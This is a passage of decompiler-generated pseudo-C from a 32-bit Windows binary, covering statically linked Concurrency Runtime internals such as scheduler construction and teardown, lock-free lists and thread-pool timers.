    result = a5;
    ++a5[7];
  }
  return result;
}

//----- (00434554) --------------------------------------------------------
int sub_434554()
{
  int result; // eax

  result = dword_4927DC;
  if ( !dword_4927DC )
  {
    sub_4304E3(&dword_492820);
    result = dword_4927DC;
    if ( !dword_4927DC )
    {
      sub_433E72();
      result = dword_4927DC;
    }
    dword_492820 = 0;
  }
  return result;
}
// 4927DC: using guessed type int dword_4927DC;
// 492820: using guessed type int dword_492820;

//----- (0043459D) --------------------------------------------------------
int __cdecl sub_43459D(int a1)
{
  int result; // eax

  if ( a1 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 20))(a1, 1);
  return result;
}

//----- (004345C0) --------------------------------------------------------
int __cdecl sub_4345C0(int a1)
{
  int result; // eax

  if ( a1 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)(a1 + 4) + 20))(a1 + 4, 1);
  return result;
}

//----- (004345E5) --------------------------------------------------------
int __cdecl sub_4345E5(int a1)
{
  int result; // eax

  if ( a1 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 16))(a1, 1);
  return result;
}

//----- (00434608) --------------------------------------------------------
unsigned int *__thiscall sub_434608(unsigned int *this, unsigned int a2)
{
  void *v3; // eax
  size_t v5; // [esp-8h] [ebp-Ch]

  this[1] = 0;
  *this = a2;
  v3 = (void *)unknown_libname_45((unsigned __int64)a2 >> 30 != 0 ? -1 : 4 * a2);
  v5 = 4 * *this;
  this[2] = (unsigned int)v3;
  memset(v3, 0, v5);
  return this;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (00434646) --------------------------------------------------------
PSLIST_HEADER __thiscall sub_434646(PSLIST_HEADER ListHead, int a2, int a3, int a4)
{
  int v4; // edx
  int v6; // edx
  int v7; // edx
  struct _SINGLE_LIST_ENTRY *v8; // edi
  struct _SINGLE_LIST_ENTRY *v9; // eax
  struct _SINGLE_LIST_ENTRY **v10; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v12; // ecx
  int v13; // eax

  v4 = a3;
  *(_DWORD *)&ListHead[4].Depth = a2;
  *(_DWORD *)&ListHead[8].Depth = a4;
  ListHead[2].Next.Next = 0;
  *(_QWORD *)&ListHead[5].Depth = 0i64;
  ListHead[7].Next.Next = (struct _SINGLE_LIST_ENTRY *)512;
  *(_QWORD *)&ListHead[7].Depth = 1i64;
  ListHead[9].Next.Next = 0;
  if ( ((v4 - 1) & v4) != 0 )
  {
    v6 = (((a3 >> 1) | a3) >> 2) | (a3 >> 1) | a3;
    v7 = (((v6 >> 4) | v6) >> 8) | (v6 >> 4) | v6;
    v4 = ((v7 >> 16) | v7) + 1;
  }
  ListHead[5].Next.Next = (struct _SINGLE_LIST_ENTRY *)v4;
  v8 = (struct _SINGLE_LIST_ENTRY *)unknown_libname_45((unsigned __int64)(unsigned int)v4 >> 30 != 0 ? -1 : 4 * v4);
  memset(v8, 0, 4 * (int)ListHead[5].Next.Next);
  v9 = (struct _SINGLE_LIST_ENTRY *)operator new(0xCu);
  if ( v9 )
  {
    v9[2].Next = (struct _SINGLE_LIST_ENTRY *)-1;
    v9->Next = v8;
    v9[1].Next = 0;
  }
  else
  {
    v9 = 0;
  }
  ListHead[6].Next.Next = v9;
  v10 = (struct _SINGLE_LIST_ENTRY **)unknown_libname_45(
                                        (unsigned __int64)(unsigned int)ListHead[7].Next.Next >> 30 != 0
                                      ? -1
                                      : 4 * (int)ListHead[7].Next.Next);
  Next = ListHead[6].Next.Next;
  *(_DWORD *)&ListHead[6].Depth = v10;
  *v10 = Next;
  InitializeSListHead(ListHead);
  InitializeSListHead(ListHead + 1);
  v12 = (int)ListHead[5].Next.Next >> 1;
  if ( v12 )
  {
    v13 = *(_DWORD *)&ListHead[5].Depth;
    do
    {
      ++v13;
      v12 >>= 1;
    }
    while ( v12 );
    *(_DWORD *)&ListHead[5].Depth = v13;
  }
  return ListHead;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0043473D) --------------------------------------------------------
_DWORD *__thiscall sub_43473D(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  sub_43F768(this, a2, a3, a4);
  *this = &Concurrency::details::CacheLocalScheduleGroupSegment::`vftable';
  this[74] = 0;
  this[75] = this + 74;
  this[76] = 0;
  return this;
}
// 471050: using guessed type void *Concurrency::details::CacheLocalScheduleGroupSegment::`vftable';

//----- (00434775) --------------------------------------------------------
_DWORD *__thiscall sub_434775(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  sub_43F768(this, a2, a3, a4);
  *this = &Concurrency::details::FairScheduleGroupSegment::`vftable';
  this[74] = 0;
  this[75] = this + 74;
  this[76] = 0;
  return this;
}
// 471090: using guessed type void *Concurrency::details::FairScheduleGroupSegment::`vftable';

//----- (004347AD) --------------------------------------------------------
void __thiscall sub_4347AD(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
}

//----- (004347C5) --------------------------------------------------------
_DWORD *__thiscall sub_4347C5(_DWORD *this, int a2)
{
  void *v3; // eax
  unsigned int v4; // ecx

  *this = a2;
  v3 = (void *)unknown_libname_45((unsigned __int64)((unsigned int)(a2 + 31) >> 5) >> 30 != 0 ? -1 : 4 * ((unsigned int)(a2 + 31) >> 5));
  v4 = *this + 31;
  this[1] = v3;
  memset(v3, 0, 4 * (v4 >> 5));
  return this;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);

//----- (0043480B) --------------------------------------------------------
HANDLE *__thiscall sub_43480B(HANDLE *this, const void **a2)
{
  unsigned int v3; // esi
  int v4; // eax
  void *v5; // eax
  void *v6; // eax
  int LastError; // eax
  _DWORD pExceptionObject[7]; // [esp+10h] [ebp-20h] BYREF
  int v10; // [esp+2Ch] [ebp-4h]

  pExceptionObject[4] = this;
  *this = &Concurrency::details::SchedulerBase::`vftable';
  v10 = 0;
  sub_43A20B(this + 1, a2);
  this[12] = 0;
  this[13] = 0;
  this[14] = 0;
  this[15] = 0;
  this[16] = 0;
  this[17] = 0;
  this[18] = 0;
  this[19] = 0;
  this[20] = 0;
  this[21] = 0;
  this[22] = 0;
  sub_434646((PSLIST_HEADER)this + 12, 0, 256, 64);
  this[45] = 0;
  this[46] = 0;
  sub_42E462(this + 47);
  sub_434646((PSLIST_HEADER)this + 25, 0, 256, 0x7FFFFFFF);
  sub_42E44D((LPCRITICAL_SECTION)(this + 70));
  this[76] = 0;
  sub_42E462(this + 77);
  this[79] = 0;
  this[80] = this + 79;
  this[81] = 0;
  this[82] = (HANDLE)-1;
  this[83] = (HANDLE)-1;
  this[84] = 0;
  this[85] = 0;
  this[86] = 0;
  sub_434608((unsigned int *)this + 87, 0x1001u);
  sub_434608((unsigned int *)this + 90, 0x1001u);
  this[93] = (HANDLE)-1;
  this[94] = 0;
  this[96] = 0;
  this[97] = 0;
  this[98] = HANDLE_FLAG_INHERIT;
  this[99] = 0;
  this[100] = 0;
  LOBYTE(v10) = 10;
  this[101] = 0;
  this[102] = 0;
  this[104] = 0;
  this[105] = 0;
  this[106] = 0;
  this[108] = 0;
  this[110] = 0;
  this[111] = 0;
  this[112] = 0;
  this[113] = 0;
  this[114] = 0;
  this[116] = 0;
  this[117] = 0;
  this[121] = 0;
  InitializeSListHead((PSLIST_HEADER)this + 61);
  InitializeSListHead((PSLIST_HEADER)this + 62);
  InitializeSListHead((PSLIST_HEADER)this + 63);
  InitializeSListHead((PSLIST_HEADER)this + 64);
  this[33] = this;
  this[2] = (HANDLE)sub_43A2A8(a2, 0);
  *((_WORD *)this + 8) = sub_43A2A8(a2, 4u);
  this[3] = (HANDLE)sub_43A2A8(a2, 7u);
  v3 = sub_43A2A8(a2, 1u);
  if ( 4 * sub_43268F() <= v3 )
    v4 = sub_43A2A8(a2, 1u);
  else
    v4 = 4 * sub_43268F();
  this[115] = (HANDLE)v4;
  this[6] = (HANDLE)sub_430139();
  v5 = (void *)sub_42FD5D(0);
  this[118] = v5;
  if ( !RegisterWaitForSingleObject(this + 119, v5, (WAITORTIMERCALLBACK)Callback, this, 0xFFFFFFFF, 0) )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_14;
    goto LABEL_13;
  }
  if ( sub_43268A() < 3 )
  {
    v6 = (void *)sub_42FDC8(this + 120, 0, (WAITORTIMERCALLBACK)sub_437D4A, this, 0x7FFFFFFFu, 0x7FFFFFFFu, 0);
  }
  else
  {
    v6 = (void *)sub_4303D0(0x7FFFFFFFu, (int)sub_437D3B, (int)this, 1);
    this[120] = v6;
  }
  if ( !v6 )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_14;
LABEL_13:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_14:
    sub_43065D(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return this;
}
// 43268A: using guessed type int sub_43268A(void);
// 470FEC: using guessed type void *Concurrency::details::SchedulerBase::`vftable';

//----- (00434AE5) --------------------------------------------------------
std::exception *__thiscall sub_434AE5(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::improper_scheduler_attach::`vftable';
  return this;
}
// 470E94: using guessed type void *Concurrency::improper_scheduler_attach::`vftable';

//----- (00434B00) --------------------------------------------------------
std::exception *__thiscall sub_434B00(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::improper_scheduler_reference::`vftable';
  return this;
}
// 470EA0: using guessed type void *Concurrency::improper_scheduler_reference::`vftable';

//----- (00434B2E) --------------------------------------------------------
void __thiscall sub_434B2E(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  struct _SINGLE_LIST_ENTRY *v3; // ecx
  PSLIST_ENTRY v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = v2 - 1;
    v2 = v2->Next;
    sub_42CF7C(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = v4 - 1;
    v4 = v4->Next;
    sub_42CF7C(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = Next - 1;
    Next = Next->Next;
    sub_42CF7C(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_42CF7C(v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j_j___free_base(v8->Next);
      sub_42CF7C(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (00434BD4) --------------------------------------------------------
void __thiscall sub_434BD4(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  int v3; // ecx
  PSLIST_ENTRY v4; // esi
  int v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  int v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = (int)&v2[-13];
    v2 = v2->Next;
    sub_4345E5(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = (int)&v4[-13];
    v4 = v4->Next;
    sub_4345E5(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = (int)&Next[-13];
    Next = Next->Next;
    sub_4345E5(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_4345E5((int)v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j_j___free_base(v8->Next);
      sub_42CF7C(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (00434C6E) --------------------------------------------------------
void __thiscall sub_434C6E(void **this)
{
  j_j_j___free_base(this[3]);
  j_j_j___free_base(this[1]);
}

//----- (00434C8F) --------------------------------------------------------
void __thiscall sub_434C8F(void **this)
{
  j_j_j___free_base(this[2]);
  j_j_j___free_base(this[1]);
}

//----- (00434CA6) --------------------------------------------------------
void __thiscall sub_434CA6(_DWORD *this)
{
  *this = &Concurrency::ScheduleGroup::`vftable';
}
// 470F8C: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (00434CB4) --------------------------------------------------------
void __thiscall sub_434CB4(char *this)
{
  *(_DWORD *)this = &Concurrency::details::SchedulerBase::`vftable';
  sub_4355B6((int)this);
  sub_4380AE((int *)this + 90);
  j_j_j___free_base(*((void **)this + 92));
  sub_4380AE((int *)this + 87);
  j_j_j___free_base(*((void **)this + 89));
  sub_42E4D7((LPCRITICAL_SECTION)(this + 280));
  sub_434B2E((PSLIST_HEADER)this + 25);
  sub_434BD4((PSLIST_HEADER)this + 12);
  j_j_j___free_base(*((void **)this + 22));
  sub_434C8F((void **)this + 18);
  sub_434C8F((void **)this + 15);
  sub_434C8F((void **)this + 12);
  sub_43A283((void **)this + 1);
  *(_DWORD *)this = &Concurrency::Scheduler::`vftable';
}
// 470FA4: using guessed type void *Concurrency::Scheduler::`vftable';
// 470FEC: using guessed type void *Concurrency::details::SchedulerBase::`vftable';

//----- (00434D6D) --------------------------------------------------------
int __thiscall sub_434D6D(_DWORD **this)
{
  return sub_430514(*this);
}

//----- (00434DA3) --------------------------------------------------------
int __thiscall sub_434DA3(_DWORD *this, int a2)
{
  int v3; // eax
  int v5; // ecx
  int v6; // esi
  int v7; // eax
  _DWORD *v8; // esi
  int v9; // eax

  v3 = a2 >> this[11];
  if ( v3 >= this[15] )
    return 0;
  v5 = this[14];
  v6 = this[13];
  if ( v3 < v5 )
  {
    v8 = *(_DWORD **)(v6 + 4 * v3);
  }
  else
  {
    v7 = v3 - v5;
    v8 = *(_DWORD **)(v6 + 4 * v5 - 4);
    if ( v7 >= 0 )
    {
      v9 = v7 + 1;
      do
      {
        v8 = (_DWORD *)v8[1];
        --v9;
      }
      while ( v9 );
    }
  }
  return *(_DWORD *)(*v8 + 4 * (a2 & (this[10] - 1)));
}

//----- (00434DEB) --------------------------------------------------------
char *__thiscall sub_434DEB(char *this, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(this, 0x10u, *((_DWORD *)this - 1), (void (__thiscall *)(void *))sub_434C6E);
    if ( (a2 & 1) != 0 )
      sub_42DC1B(this - 4);
    return this - 4;
  }
  else
  {
    sub_434C6E((void **)this);
    if ( (a2 & 1) != 0 )
      sub_42CF7C(this);
    return this;
  }
}

//----- (00434E70) --------------------------------------------------------
_DWORD *__thiscall sub_434E70(_DWORD *Block, char a2)
{
  *Block = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 470F8C: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (00434E93) --------------------------------------------------------
void *__thiscall sub_434E93(void *Block, char a2)
{
  sub_43FA1B((signed __int32)Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00434EB8) --------------------------------------------------------
_DWORD *__thiscall sub_434EB8(_DWORD *Block, char a2)
{
  *Block = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 470F8C: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (00434EFE) --------------------------------------------------------
_DWORD *__thiscall sub_434EFE(_DWORD *Block, char a2)
{
  *Block = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 470F8C: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (00434F21) --------------------------------------------------------
_DWORD *__thiscall sub_434F21(_DWORD *Block, char a2)
{
  *Block = &Concurrency::Scheduler::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 470FA4: using guessed type void *Concurrency::Scheduler::`vftable';

//----- (00434F44) --------------------------------------------------------
char *__thiscall sub_434F44(char *Block, char a2)
{
  sub_434CB4(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00434F69) --------------------------------------------------------
char *__thiscall sub_434F69(char *Block, char a2)
{
  `eh vector destructor iterator'(Block + 4, 8u, 0x60u, (void (__thiscall *)(void *))sub_43DC42);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00434FEC) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_434FEC(_DWORD *this, signed __int32 a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_45((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_43055D;
        do
          sub_42E8F5((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *(_DWORD *)(a2 + 24) = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 42D1CA: using guessed type int __cdecl unknown_libname_45(_DWORD);
// 434FEC: using guessed type char var_24[8];

//----- (00435148) --------------------------------------------------------
signed __int32 __thiscall sub_435148(volatile signed __int32 *this, int a2)
{
  volatile signed __int32 *v3; // eax

  v3 = (volatile signed __int32 *)operator new(8u);
  if ( v3 )
    *((_DWORD *)v3 + 1) = a2;
  else
    v3 = 0;
  return sub_436FFF(this + 45, v3);
}

//----- (00435179) --------------------------------------------------------
int __thiscall sub_435179(int *this, int a2)
{
  int result; // eax

  if ( *this )
  {
    *(_DWORD *)(a2 + 4) = *(_DWORD *)(*this + 4);
    *(_DWORD *)(a2 + 8) = *this;
    *(_DWORD *)(*(_DWORD *)(*this + 4) + 8) = a2;
    result = *this;
    *(_DWORD *)(*this + 4) = a2;
  }
  else
  {
    *this = a2;
    *(_DWORD *)(a2 + 8) = a2;
    result = *this;
    *(_DWORD *)(*this + 4) = *this;
  }
  return result;
}

//----- (004351AD) --------------------------------------------------------
_DWORD *__thiscall sub_4351AD(void *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = *(_DWORD **)this;
  if ( *(_DWORD *)this )
  {
    *a2 = *result;
    a2[1] = *(_DWORD *)this;
    *(_DWORD *)(**(_DWORD **)this + 4) = a2;
    result = *(_DWORD **)this;
    **(_DWORD **)this = a2;
  }
  else
  {
    *a2 = a2;
    a2[1] = a2;
  }
  *(_DWORD *)this = a2;
  return result;
}

//----- (004351DA) --------------------------------------------------------
void __thiscall sub_4351DA(volatile signed __int32 *this, _DWORD *a2)
{
  sub_42E793(this + 1);
  sub_4351AD((void *)this, a2);
  sub_42E8AD(this + 1);
}

//----- (0043520E) --------------------------------------------------------
int __thiscall sub_43520E(int this, int a2, unsigned int a3)
{
  int result; // eax
  unsigned int i; // ebx
  int v6; // eax
  int v7; // esi
  char pExceptionObject[12]; // [esp+Ch] [ebp-10h] BYREF
  int (__thiscall ***v9)(_DWORD); // [esp+18h] [ebp-4h]

  result = a2;
  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "ppVirtualProcessorRoots");
LABEL_10:
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !a3 )
  {
    sub_429626((std::exception *)pExceptionObject, "count");
    goto LABEL_10;
  }
  for ( i = 0; i < a3; ++i )
  {
    v9 = *(int (__thiscall ****)(_DWORD))(result + 4 * i);
    v6 = (**v9)(v9);
    v7 = v6;
    if ( !*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 36) + 4 * v6) + 188) )
      sub_43F528(*(volatile __int32 **)(*(_DWORD *)(this + 36) + 4 * v6));
    sub_43D8D5(*(_DWORD **)(*(_DWORD *)(this + 32) + 4 * v7), (int)v9, 0);
    _InterlockedIncrement((volatile signed __int32 *)(this + 20));
    result = a2;
  }
  return result;
}

//----- (004352A4) --------------------------------------------------------
_DWORD *__thiscall sub_4352A4(void *this, int a2, _DWORD *a3)
{
  _DWORD *v4; // ecx
  _DWORD *result; // eax

  v4 = operator new(0x138u);
  result = 0;
  if ( v4 )
    return sub_43473D(v4, (int)this, a2, a3);
  return result;
}

//----- (004352DF) --------------------------------------------------------
_DWORD *__thiscall sub_4352DF(void *this, int a2, int a3)
{
  int v4; // esi
  _DWORD *v5; // eax
  int v7[8]; // [esp+10h] [ebp-20h] BYREF

  v4 = 0;
  memset(v7, 0, 16);
  v5 = operator new(0x138u);
  v7[4] = (int)v5;
  v7[7] = 0;
  if ( v5 )
    return sub_434775(v5, (int)this, a2, v7);
  return (_DWORD *)v4;
}

//----- (0043532B) --------------------------------------------------------
int __thiscall sub_43532B(int this)
{
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  if ( sub_4359C9() == this )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_attach_Concurrency__);
  }
  sub_435371((volatile signed __int32 *)this, 1);
  return sub_437E96(7, 4u, *(_DWORD *)(this + 372));
}

//----- (00435371) --------------------------------------------------------
_DWORD *__thiscall sub_435371(volatile signed __int32 *this, char a2)
{
  volatile signed __int32 **v3; // eax
  int v4; // edi
  _DWORD *v5; // esi
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  v3 = (volatile signed __int32 **)sub_430184(dword_4927F0);
  v4 = (int)v3;
  if ( v3 )
  {
    if ( v3[7] == this )
    {
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_attach_Concurrency__);
    }
    if ( !*((_BYTE *)v3 + 76) )
      sub_43E91A((int)(v3 - 1));
    sub_43881B();
  }
  sub_437141(this);
  v5 = sub_435FAC((union _SLIST_HEADER *)this, a2);
  sub_438CD1(v5, v4);
  return v5;
}

//----- (004353E1) --------------------------------------------------------
int __thiscall sub_4353E1(volatile signed __int32 *this)
{
  int result; // eax

  result = _InterlockedCompareExchange(this + 101, -1073741824, 0x80000000);
  if ( result == 0x80000000 )
    return sub_437B89(this);
  return result;
}

//----- (00435404) --------------------------------------------------------
int __thiscall sub_435404(int this)
{
  int result; // eax
  int **i; // ebx

  sub_438FB0();
  sub_43731A((union _SLIST_HEADER *)this);
  result = sub_438FB0();
  for ( i = *(int ***)(this + 180); i; i = (int **)*i )
    result = (*(int (__thiscall **)(int *))(*i[1] + 24))(i[1]);
  return result;
}
// 438FB0: using guessed type int sub_438FB0(void);

//----- (00435442) --------------------------------------------------------
int __thiscall sub_435442(_DWORD *this, ULONG DueTime)
{
  int v3; // eax
  void *v4; // esi
  __int64 v6; // [esp+4h] [ebp-8h] BYREF

  v3 = sub_43268A();
  v4 = (void *)this[120];
  if ( v3 < 3 )
    return sub_42FD38(0, v4, DueTime, 0x7FFFFFFFu);
  v6 = -10000i64 * DueTime;
  return __crtSetThreadpoolTimer(v4, &v6, 0x7FFFFFFF, 0);
}
// 42C22C: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);
// 43268A: using guessed type int sub_43268A(void);

//----- (00435513) --------------------------------------------------------
unsigned int __cdecl sub_435513(int a1)
{
  unsigned int result; // eax
  _DWORD *v2; // esi
  _DWORD *v3; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 36) + 404) & 0xA0000000;
  if ( result != -1610612736 )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = v2 - 1;
      v2 = (_DWORD *)*v2;
      sub_42CF7C(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0043551F) --------------------------------------------------------
unsigned int __cdecl sub_43551F(int a1)
{
  unsigned int result; // eax
  _DWORD *v2; // esi
  int v3; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 36) + 404) & 0xA0000000;
  if ( result != -1610612736 )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = (int)(v2 - 13);
      v2 = (_DWORD *)*v2;
      sub_4345E5(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0043552B) --------------------------------------------------------
int *sub_43552B()
{
  int *result; // eax

  result = (int *)_InterlockedDecrement(&dword_48C354);
  if ( result == (int *)0x80000000 )
  {
    sub_436D05();
    result = &dword_48C354;
    _InterlockedAnd(&dword_48C354, 0x7FFFFFFFu);
  }
  return result;
}
// 48C354: using guessed type int dword_48C354;

//----- (00435551) --------------------------------------------------------
int *sub_435551()
{
  int *result; // eax

  sub_4304E3(&dword_492810);
  result = (int *)(dword_4927F8 + 1);
  dword_4927F8 = (int)result;
  if ( result == (int *)1 )
  {
    if ( !dword_492850 )
      result = (int *)sub_43C899();
    if ( dword_48C354 >= 0 )
    {
      sub_436CF1();
      result = &dword_48C354;
      _InterlockedOr(&dword_48C354, 0x80000000);
    }
  }
  dword_492810 = 0;
  return result;
}
// 48C354: using guessed type int dword_48C354;
// 4927F8: using guessed type int dword_4927F8;
// 492810: using guessed type int dword_492810;

//----- (004355B6) --------------------------------------------------------
char *__thiscall sub_4355B6(int this)
{
  int v2; // esi
  int v3; // eax
  int v4; // eax
  void *v5; // ebx
  int v6; // esi
  int v7; // eax
  void *v8; // ebx
  char *v9; // ecx

  v2 = 0;
  v3 = *(_DWORD *)(this + 44);
  if ( v3 > 0 )
  {
    do
    {
      v4 = *(_DWORD *)(this + 32);
      v5 = *(void **)(v4 + 4 * v2);
      if ( v5 )
      {
        sub_43D750(*(_DWORD *)(v4 + 4 * v2));
        sub_42CF7C(v5);
      }
      v3 = *(_DWORD *)(this + 44);
      ++v2;
    }
    while ( v2 < v3 );
  }
  v6 = 0;
  if ( v3 > 0 )
  {
    do
    {
      v7 = *(_DWORD *)(this + 36);
      v8 = *(void **)(v7 + 4 * v6);
      if ( v8 )
      {
        sub_43F510(*(union _SLIST_HEADER **)(v7 + 4 * v6));
        sub_42CF7C(v8);
      }
      ++v6;
    }
    while ( v6 < *(_DWORD *)(this + 44) );
  }
  j_j_j___free_base(*(void **)(this + 92));
  j_j_j___free_base(*(void **)(this + 32));
  j_j_j___free_base(*(void **)(this + 36));
  v9 = *(char **)(this + 28);
  if ( v9 )
    sub_434DEB(v9, 3);
  sub_430176(*(_DWORD *)(this + 24));
  *(_DWORD *)(this + 24) = 0;
